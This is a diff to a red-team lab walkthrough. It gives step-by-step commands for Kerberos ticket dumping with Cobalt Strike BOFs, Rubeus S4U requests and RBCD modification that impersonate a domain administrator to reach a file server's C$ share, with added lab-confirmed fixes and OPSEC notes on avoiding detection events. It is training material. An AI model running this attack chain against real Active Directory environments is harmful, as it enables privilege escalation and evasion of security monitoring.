@@ -103,18 +103,26 @@
 
     ```
     krb_triage
-    krb_dump /luid:244f58 /service:krbtgt
     ```
+    
+    > ⚠️ Lab-confirmed (2026-04-19): LUID varies per session — do NOT hardcode `/luid:244f58`. Always run `krb_triage` first to find the current rsteel LUID (e.g. `0x1e7efb` in this run).
+    
+    ```
+    krb_dump /luid:<rsteel-LUID-from-krb_triage> /service:krbtgt
+    ```
+    
+    > OPSEC-🟠CAUTION — BOF, uses `LsaCallAuthenticationPackage` Kerberos API. No raw LSASS read.
+    > ⚠️ Use `/luid:1e7efb` NOT `/luid:0x1e7efb` — Kerbeus-BOF rejects 0x prefix ("Invalid luid").
     
 5. Before using the above output base64 ticket for `rsteal` we need to purge `pchilds`. In the netonly process on the Attacker Desktop, purge LDAP ticket for pchilds.
     
-    ```Terminal-nocolor
+    ```PowerShell
     C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
     ```
 
 6. Request a new LDAP service ticket with `rsteel` TGT, and paste in rsteel TGT base64 ticket given us LDAP tgt ticket.
 
-	```Terminal-nocolor
+	```PowerShell
 	C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
     ```
 
@@ -128,7 +136,7 @@
     Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
     ```
 
-⚠️ This shows that there's already an RBCD configuration between *lon-ws-1* and *lon-fs-1*.  We need to be careful not to remove this by mistake. We already have system on wkstn1 beacon.  
+⚠️ Lab-confirmed (2026-04-19): LON-FS-1 already has LON-WS-1 as an existing RBCD delegate. **Do NOT overwrite** — add alongside the existing entry (see step 2).
 
 2. Add a new RBCD config between *lon-fs-1* and *lon-wkstn-1*, making sure not to overwrite the existing entry.
 
@@ -138,7 +146,9 @@
     Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
     ```
 
-3. Above results in adding additional wkstn1 as delegate to account and not remove current ws1. Verify that `lon-wkstn-1` was added.
+> ⚠️ Critical: pass **both** `$ws1,$wkstn1` to preserve the existing LON-WS-1 entry. Using only `$wkstn1` would remove LON-WS-1. Lab-confirmed result: `LON-FS-1: {LON-WS-1, LON-WKSTN-1}`.
+
+3. Verify that both `lon-ws-1` and `lon-wkstn-1` are present.
   
     ```PowerShell
     Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
@@ -148,23 +158,48 @@
 4. Go back to Cobalt Strike again, and dump the TGT for *lon-wkstn-1* from high integrity system user beacon to enable exploitation using workstation tgt.  
 
     ```
-    krb_dump /luid:3e7 /service:krbtgt 
-    ```  
+    krb_dump /luid:3e7 /service:krbtgt
+    ```
+    
+    > OPSEC-🟠CAUTION — BOF, Kerberos API. Requires SYSTEM context. `/luid:3e7` = machine account session — always present on domain-joined host.
+    > ⚠️ NO 0x prefix — `/luid:0x3e7` = "Invalid luid" error (Kerbeus-BOF lab-confirmed).  
     
 5. Use above base64 TGT ticket copied to clipboard. Request a usable service ticket for *cifs/lon-fs-1*, impersonating the default domain administrator.
   
     ```PowerShell-nocolor
     C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
     ```
-⚠️ OPSEC Safe to dump kirbi files on attacker desktop that is not monitored by SOC blue team.
+
+> OPSEC-🟢SAFE — Rubeus runs on the attacker desktop (not via beacon), files written locally only. Attacker desktop is not monitored by SOC blue team.
+> 
+> ⚠️ Lab-confirmed (2026-04-19): Rubeus `/outfile` with a **directory path** auto-names the files:
+> - S4U2self ticket: `_Administrator_to_LON-WKSTN-1$@CONTOSO.COM`
+> - S4U2proxy cifs ticket: `_cifs_lon-fs-1`
+> 
+> The file you need for `kerberos_ticket_use` is `_cifs_lon-fs-1` (no extension). Copy the exact filename from Rubeus output line:
+> `[*] Ticket written to C:\Users\Attacker\Desktop\_cifs_lon-fs-1`
 
 6. Use the ticket file output to attacker desktop to list the C$ share content on `lon-fs-1`.
 
-    ```
+    ```cs
+    // Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, lab-confirmed working)
+    kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
+    ls \\lon-fs-1\c$
+
+    // Option B — with make_token (OPSEC-🟠CAUTION — Event 4648, cleaner session)
     make_token CONTOSO\Administrator FakePass
     kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
     ls \\lon-fs-1\c$
-    ```  
+    ```
+
+> ⚠️ Lab-confirmed (2026-04-19): make_token was **not run** and `ls \\lon-fs-1\c$` succeeded. The remote server validates the Kerberos ticket content, not the local session identity — `kerberos_ticket_use` injects the ticket into the current beacon logon session directly.
+
+Cleanup — revoke token and purge ticket:
+
+```cs
+rev2self
+kerberos_ticket_purge
+```  
     
 7. On the Attacker Desktop, restore the RBCD configuration back to how it was.
 
@@ -174,3 +209,18 @@
     ```
 
 ⚠️ In this lab, you have learned how to leverage a `WriteProperty` primitive with RBCD to compromise a computer.
+
+===
+
+## Lab Observations (2026-04-19)
+
+| Finding | Detail |
+|---------|--------|
+| `make_token` not required | `kerberos_ticket_use _cifs_lon-fs-1` succeeded without `make_token`. Remote server validates Kerberos ticket content, not local session identity. Skipping avoids Event 4648. |
+| Rubeus s4u output filename | `/outfile:C:\Users\Attacker\Desktop\` (directory) auto-names files: S4U2self = `_Administrator_to_LON-WKSTN-1$@CONTOSO.COM`, S4U2proxy = `_cifs_lon-fs-1`. Use exact path from Rubeus output. |
+| LUID varies per session | Lab doc shows `/luid:244f58` but actual was `/luid:1e7efb`. Always run `krb_triage` first — never hardcode LUID. |
+| Existing RBCD must be preserved | LON-FS-1 already had LON-WS-1. Set both: `$ws1,$wkstn1` — using only one overwrites and removes the other. |
+| WriteProperty principal | SID `...1107` = "Server Admins" group. Member: Robert Steel (rsteel). Controls: LON-WS-1, LON-FS-1, LON-DB-1, LON-DB-2, LON-CS-1. |
+| krb_dump luid format | `/luid:3e7` and `/luid:1e7efb` — NO 0x prefix. Kerbeus-BOF rejects 0x prefix. |
+| krb_tgtdeleg for pchilds | Used from medium-integrity pchilds beacon — no SYSTEM required. Provides forwardable TGT for proxy-based LDAP queries. |
+| Rubeus purge before re-using pchilds session | Must purge pchilds ldap ticket before importing rsteel ldap ticket — otherwise two tickets conflict in the same session. |
